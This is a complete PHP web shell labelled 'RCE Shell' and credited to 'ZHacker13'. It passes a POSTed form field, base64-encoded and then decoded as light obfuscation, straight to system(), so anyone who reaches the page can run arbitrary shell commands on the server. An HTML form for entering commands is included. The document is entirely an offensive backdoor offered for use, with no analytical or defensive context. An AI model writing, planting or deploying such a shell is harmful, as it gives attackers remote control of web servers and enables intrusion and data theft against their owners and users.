<?php

   // Script: Remote Command exection PHP Shell - using Base64 Encode,
   // By: ZHacker13,

   $command = $_POST['command'];
   $base64 = base64_encode($command);
   $exection = ${@system(base64_decode($base64))};
   
?>

<html>
<head>
<title>RCE Shell</title>
</head>
<body>
<form action="#" method="POST" size="50">
<input type="text" name="command" size="100"/>
<input type="submit" value="Run" size="50"/>
</form>
<tr><td> <input type="hidden" name="type" value="<?= $exection ?>" ></td></tr>
</body>
</html>